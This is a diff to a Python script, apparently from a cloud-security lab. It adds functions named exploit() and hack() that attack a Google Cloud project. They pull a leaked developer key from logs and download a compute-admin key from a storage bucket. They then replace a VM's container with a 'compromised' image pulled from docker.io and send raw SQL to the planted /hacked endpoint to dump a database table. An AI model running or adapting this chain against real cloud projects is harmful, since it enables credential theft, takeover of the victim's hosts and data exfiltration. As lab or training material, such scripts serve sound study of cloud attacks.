@@ -8,7 +8,7 @@ import csv
 import sqlalchemy
 import google.auth
 import requests
-import urllib 
+import shutil
 
 from googleapiclient import discovery
 from sqlalchemy.sql import text
@@ -23,19 +23,65 @@ from core.framework.cloudhelpers import (
 )
 import google.auth.transport.requests
 from google.auth.transport.requests import AuthorizedSession
-#os.environ['GOOGLE_APPLICATION_CREDENTIALS'] = 'start/dev-account.json'
 
-def main():
+
+def exploit(nonce):
     credentials, project_id = google.auth.default()
-    nonce = sys.argv[1]
+    logging_key = iam.generate_service_account_key('log-viewer')
+    logging_client = glogging.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(logging_key)))
+    logger = logging_client.logger('rmUser')
+    logs = logger.list_entries()
+    dev_key = list(logs)[-1].payload['auth']
+    storage_client = storage.Client(credentials=service_account.Credentials.from_service_account_info(json.loads(dev_key)))
+    blobs = list(storage_client.list_blobs(f'vm-image-bucket-{nonce}'))
+    temp_dir = 'test/' ###TODO change me
+    os.mkdir(temp_dir)
+    for blob in blobs:
+        blob.download_to_filename(f'{temp_dir}{blob.name}')
 
-    url = "http://us-central1-" + project_id + ".cloudfunctions.net/rm-user-" + nonce
+    with open(f'{temp_dir}compute-admin.json') as keyfile:    
+        compute_admin_key = json.loads(keyfile.read())
+    
+    compute_api = discovery.build('compute', 'v1', credentials=service_account.Credentials.from_service_account_info(compute_admin_key))
+    api_instance = compute_api.instances().get(project=project_id, zone='us-west1-b', instance='api-engine').execute()
+    new_gce = '''
+    metadata:
+      name: a6
+    spec:
+      containers:
+      - image: docker.io/aujxn/defender-audit-compromised:latest
+        imagePullPolicy: Always
+        name: a6
+        ports:
+        - containerPort: 80
+          hostPort: 80
+        volumeMounts: []
+      volumes: []
 
-    req = google.auth.transport.requests.Request()
-    id_token = google.oauth2.id_token.fetch_id_token(req, url)
-    headers = {'Authorization': f"Bearer {id_token}"}
-    data = {'name':'Robert Caldwell', 'authentication':'hjhadsfkjhgadsfkjhgaewkjygdasfjhgdfkjygadsjkygdakfjuygdfahjkygfdajskhygfy76t478t3487y3grewu7ydfg'}
-    resp = req(url, method = 'POST', body = data, headers = headers)
-    print(vars(resp))
+  '''
+    fingerprint = api_instance['metadata']['fingerprint']
+    payload = {'fingerprint': fingerprint, 'items': [{'key': 'gce-container-declaration', 'value': new_gce}]}
+    compute_api.instances().setMetadata(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine', body=payload).execute()
+    compute_api.instances().stop(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine').execute()
+    compute_api.instances().start(project='atomic-hash-305702', zone='us-west1-b', instance='api-engine').execute()
+    shutil.rmtree(temp_dir)
 
-main()
+def hack():
+    credentials, project_id = google.auth.default()
+    compute_api = discovery.build('compute', 'v1', credentials=credentials)
+    response = compute_api.instances().list(project=project_id, zone='us-west1-b').execute()
+
+    for instance in response['items']:
+        if instance['name'] == 'api-engine':            
+            hostname = instance['networkInterfaces'][0]['accessConfigs'][0]['natIP']
+            break
+
+    url = f'http://{hostname}/hacked'
+
+    payload = {'sql': 'select * from devs;'}
+    response = requests.post(url, data=payload)
+    print(response.text)
+
+exploit('174998777945')
+
+hack()
